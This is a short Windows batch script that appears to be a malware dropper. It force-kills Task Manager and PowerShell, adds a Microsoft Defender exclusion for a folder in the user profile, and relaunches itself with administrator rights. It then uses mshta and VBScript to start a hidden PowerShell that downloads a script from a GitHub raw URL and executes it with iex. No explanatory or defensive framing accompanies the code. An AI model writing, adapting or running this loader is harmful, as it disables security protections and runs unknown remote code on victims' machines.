@echo off
taskkill /f /im taskmgr.exe
taskkill /f /im powershell.exe
start powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%userprofile%\150F4013'"

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t",0))
